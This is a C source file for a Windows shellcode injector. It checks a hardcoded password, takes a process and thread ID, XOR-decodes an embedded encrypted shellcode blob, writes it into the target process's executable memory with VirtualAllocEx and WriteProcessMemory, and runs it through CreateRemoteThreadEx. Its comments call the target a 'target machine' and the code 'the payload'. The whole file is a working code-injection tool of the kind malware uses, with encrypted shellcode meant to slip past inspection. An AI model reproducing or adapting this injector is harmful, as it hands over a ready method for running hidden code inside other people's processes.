#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <bcrypt.h>
#include <tlhelp32.h>
#include "func.h"
#include <time.h>
#include <ntstatus.h>



const char* k = "[*]";
const char* i = "[+]";
const char* e = "[-]";

DWORD PID ,TID;
HANDLE hProcess, hThread, hSnapshot = NULL ;

PROCESSENTRY32 MyProc = {
.dwSize = sizeof(PROCESSENTRY32)
};

BOOL verifier = FALSE; 
BOOL finded = FALSE; 
char input[10], tid[10],pid[10], choice[10];

LPVOID pBuffer;


/* Declaration of arguments of EncrytpioN 7anoni */

PVOID PcipherT = NULL;
DWORD Ciphersize = NULL;
BOOL successEnc;
BOOL successDec = TRUE;
PVOID restoreShell = NULL;
BYTE Mykey[KEYSIZE] = {
	0xaf, 0x3f, 0xc3, 0x1e, 0x24, 0x57, 0x62, 0xbe,
	0xfb, 0xb3, 0xf7, 0x94, 0xe0, 0x61, 0x88, 0x3d,
	0xc8, 0x19, 0x9f, 0x03, 0x8d, 0xc8, 0xb9, 0x7c,
	0xf1, 0x44, 0xfa, 0xb4, 0x73, 0x65, 0xd7, 0x7d
};

int key = 46 ;

BYTE Myiv[IVSIZE] = {
	0x5d, 0x76, 0xad, 0x38, 0xad, 0xb6, 0x96, 0x97,
	0x17, 0x5a, 0x8a, 0x91, 0xba, 0x06, 0xe9, 0x11
};

char secret[] = "ukb09\n";
wchar_t TargetPr[] = L"explorer.exe";








unsigned char shellenc[] =
"\xd2\xc6\xac\x2e\x2e\x2e\x4e\xa7\xcb\x1f\xee\x4a\xa5\x7e\x1e\xa5"
"\x7c\x22\xa5\x7c\x3a\xa5\x5c\x06\x21\x99\x64\x08\x1f\xd1\x82\x12"
"\x4f\x52\x2c\x02\x0e\xef\xe1\x23\x2f\xe9\xcc\xdc\x7c\x79\xa5\x7c"
"\x3e\xa5\x64\x12\xa5\x62\x3f\x56\xcd\x66\x2f\xff\x7f\xa5\x77\x0e"
"\x2f\xfd\xa5\x67\x36\xcd\x14\x67\xa5\x1a\xa5\x2f\xf8\x1f\xd1\x82"
"\xef\xe1\x23\x2f\xe9\x16\xce\x5b\xd8\x2d\x53\xd6\x15\x53\x0a\x5b"
"\xca\x76\xa5\x76\x0a\x2f\xfd\x48\xa5\x22\x65\xa5\x76\x32\x2f\xfd"
"\xa5\x2a\xa5\x2f\xfe\xa7\x6a\x0a\x0a\x75\x75\x4f\x77\x74\x7f\xd1"
"\xce\x71\x71\x74\xa5\x3c\xc5\xa3\x73\x44\x2f\xa3\xab\x9c\x2e\x2e"
"\x2e\x7e\x46\x1f\xa5\x41\xa9\xd1\xfb\x95\xde\x9b\x8c\x78\x46\x88"
"\xbb\x93\xb3\xd1\xfb\x12\x28\x52\x24\xae\xd5\xce\x5b\x2b\x95\x69"
"\x3d\x5c\x41\x44\x2e\x7d\xd1\xfb\x6d\x14\x72\x72\x7e\x5c\x41\x49"
"\x5c\x4f\x43\x0e\x68\x47\x42\x4b\x5d\x72\x72\x69\x41\x41\x49\x42"
"\x4b\x72\x72\x6d\x46\x5c\x41\x43\x4b\x72\x72\x6f\x5e\x5e\x42\x47"
"\x4d\x4f\x5a\x47\x41\x40\x72\x72\x4d\x46\x5c\x41\x43\x4b\x00\x4b"
"\x56\x4b\x2e";




int main(int argc , char* argv[]) {

	printf("   _____ _                           _______   _                       \n");
	printf("  / ____| |                         |__   __| (_)                      \n");
	printf(" | |    | |__  _ __ ___  _ __ ___   ___| |_ __ _  __ _  __ _  ___ _ __ \n");
	printf(" | |    | '_ \\| '__/ _ \\| '_ ` _ \\ / _ \\ | '__| |/ _` |/ _` |/ _ \\ '__|\n");
	printf(" | |____| | | | | | (_) | | | | | |  __/ | |  | | (_| | (_| |  __/ |   \n");
	printf("  \\_____|_| |_|_|  \\___/|_| |_| |_|\\___|_|_|  |_|\\__,_|\\__,_|\\___|_|   \n");
	printf("                                                  __/ | __/ |          \n");
	printf("                                                 |___/ |___/           \n");

	printf("   _____       _      _            \n");
	printf("  / ____|     | |    (_)           \n");
	printf(" | (___   __ _| |     _ _ __ ___   \n");
	printf("  \\___ \\ / _` | |    | | '_ ` _ \\  \n");
	printf("  ____) | (_| | |____| | | | | | | \n");
	printf(" |_____/ \\__,_|______|_|_| |_| |_| \n");
	printf("                                   \n");
	printf("                                   \n");



	printf("------------------------------------------------------------------------------------------------------------------------ \n");
	printf("%s Entre your passwoard :   ", i);
	fgets(input,sizeof(input),stdin);

	printf("%s Entre The PID  :    ", i);
	fgets(pid, sizeof(pid), stdin);
	pid[strcspn(pid, "\n")] = 0;

	// Print the TID to verify it has been cleaned
	printf("You entered PID: %s\n", pid);
	PID = atoi(pid);
	
	printf("%s Entre The TID  :    ", i);
	fgets(tid, sizeof(tid), stdin);
	tid[strcspn(tid, "\n")] = 0;

	// Print the TID to verify it has been cleaned
	printf("You entered TID: %s\n", tid);
	TID = atoi(tid);
	
	if (strcmp(input, secret) != 0) {
		printf("%s error :invalid password \n", e);

		return EXIT_FAILURE;
	}


	printf("------------------------------------------------------------------------------------------------------------------------ \n");
	printf("%s Should What encryption you want  :\n  ", i);
	printf("1-XOR\n");
	printf("2-AES\n");
	printf("3-RC4\n");
	fgets(choice, sizeof(choice), stdin);

	choice[strcspn(choice, "\n")] = 0;

	if (strcmp(choice, "1") != 0) {
		printf("%s ,Service Not availble Yet \n", e);

		return EXIT_FAILURE;
	}



	/* Here We take a snapshot for the current processes to be able to access to process */


   hSnapshot= CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

   if (hSnapshot == NULL) {

	   printf("%s error : on Taking the snapshot \n", e);
	   return EXIT_FAILURE;
   }


   /* Now we search about any Chrome open in our  target machine */ 

   
   verifier = Process32First(hSnapshot, &MyProc);

   if (!verifier) {

	   printf("%s error in opening the first process , code : %d  \n ", e,GetLastError);
	   return EXIT_FAILURE;

   }

   printf("%s We are in the first process \n ", i);

  
  // do {


	   //printf("%s , the Current process : %ls \n ", i, MyProc.szExeFile);
	   //if  (wcscmp(MyProc.szExeFile, TargetPr) == 0) {
		 //  printf("%s founded \n ", i);
		  // finded = TRUE;

		   hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, PID);

		   if (hProcess == NULL) {

			   printf("%s error : the Hprocess is null , code : %d \n", e, GetLastError);
			   return EXIT_FAILURE;
		   }

		   // We need to decrypt our shellcode 7anoniiiiii 

		   printf("%s  Decryption begin ;: -------------->>>>>>  \n", i);
		  
		  XorEncrypt(&shellenc, sizeof(shellenc), key);

		  // successDec = Decryption(shellenc, sizeof(shellenc),Mykey, Myiv, restoreShell, sizeof(shellenc));
		  // successDec = AesDecrypt(shellenc, sizeof(shellenc), Mykey, Myiv, &restoreShell, &decryptedSize);


	

		   pBuffer = VirtualAllocEx(hProcess,NULL,  sizeof(shellenc), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
		   
		   if (pBuffer == NULL) {

			   printf("%s error in Pbuffer : %ld", e, GetLastError());
			   return EXIT_FAILURE;

		   }

		   printf("%s we reserved memory for the handle : \\--0x%p  with PAGE_EXECUTE_READWRITE Permisions \n", i, hProcess);

		   // write the allocated memory into the process memory  

		   if (!WriteProcessMemory(hProcess, pBuffer, shellenc, sizeof(shellenc), NULL)) {
			   printf("%s we can write into processMemory error : %ld", e, GetLastError());
			   EXIT_FAILURE;
		   }
		   // Verify that the pBuffer has the shellcode 
		   SIZE_T bufferSize = sizeof(shellenc); // Size of the memory to read

		   readBufferContent(hProcess, pBuffer, bufferSize);


		   // Create a thread to run the payload 

		   hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pBuffer, NULL, 0, NULL, &TID);

		   if (hThread == NULL) {
			   printf("%s failed to create handle to the thread , error : %ld ", e, GetLastError());
			   CloseHandle(hProcess);
			   EXIT_FAILURE;
		   }
		   printf("%s we got a handle : \\--0x%p for thread : %ld \n", i, hThread, TID);


		   // Threat waiting
		   printf("%s Waiting for thread for finishing\n", i);
		   printf("%s Enter 1 if you want to close the exe  \n", i);
		   fgets(input, sizeof(input), stdin);
		   input[strcspn(input, "\n")] = 0;



		   if (strcmp(input, "1") != 0) {
			   printf("%s error :invalid code \n", e);

			   return EXIT_FAILURE;
		   }
		   WaitForSingleObject(hThread, INFINITE);
		   printf("%s Threat Finish Excution \n", i);

		   // Cleaning up 
		 
		   return EXIT_SUCCESS;


	  //}

  // } while (Process32Next(hSnapshot, &MyProc) & !finded ); 
  // }


  // if (!finded) {

//	   printf("%s Error : target not found ,code : %d  \n ", e, GetLastError);

  // }
   
   printf("%s Cleaning-up the handles \n", i);
   CloseHandle(hProcess);
   CloseHandle(hThread);
   printf("%s We are finished \n", i);
   




   

   





}